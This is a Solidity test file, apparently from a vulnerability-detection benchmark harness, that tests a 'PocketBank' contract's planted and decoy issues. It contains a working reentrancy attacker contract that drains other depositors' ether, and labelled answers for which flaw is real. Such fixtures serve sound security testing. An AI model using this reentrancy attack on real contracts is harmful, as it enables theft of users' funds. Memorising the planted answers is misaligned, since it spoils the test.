// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {PocketBank} from "../src/fixed/PocketBank.sol";

// Fixture proof for the harness tests. No forge-std: a test passes when it does not revert.
// Vulnerable.t.sol and Fixed.t.sol differ only in the import path and the test contract name.

contract Reenterer {
    PocketBank internal immutable bank;
    uint256 internal rounds;

    constructor(PocketBank bank_) {
        bank = bank_;
    }

    function attack() external payable {
        bank.deposit{value: msg.value}();
        bank.withdrawAll();
    }

    receive() external payable {
        if (rounds < 3) {
            rounds++;
            bank.withdrawAll();
        }
    }
}

contract Outsider {
    function trySweep(PocketBank bank) external returns (bool ok) {
        (ok, ) = address(bank).call(abi.encodeCall(PocketBank.sweepDust, (payable(address(this)))));
    }

    receive() external payable {}
}

contract FixedTest {
    PocketBank internal bank;

    function setUp() public {
        bank = new PocketBank();
        bank.deposit{value: 10 ether}();
    }

    /// Deposits 1 ether, re-enters withdrawAll three times and leaves with four payouts.
    function test_planted_P1() public {
        Reenterer thief = new Reenterer(bank);
        thief.attack{value: 1 ether}();
        require(address(thief).balance == 3.99 ether, "thief did not collect four payouts");
        require(address(bank).balance == 7.01 ether, "bank did not lose the other depositors' ether");
    }

    /// sweepDust has no modifier, but only the owner gets past its first line.
    function test_decoy_D1() public {
        bank.withdrawAll();
        require(bank.feesAccrued() == 0.025 ether, "fee not accrued");
        Outsider outsider = new Outsider();
        require(!outsider.trySweep(bank), "outsider swept the fees");
        require(bank.feesAccrued() == 0.025 ether, "fees moved");
        bank.sweepDust(payable(address(outsider)));
        require(address(outsider).balance == 0.025 ether, "owner sweep failed");
    }

    receive() external payable {}
}
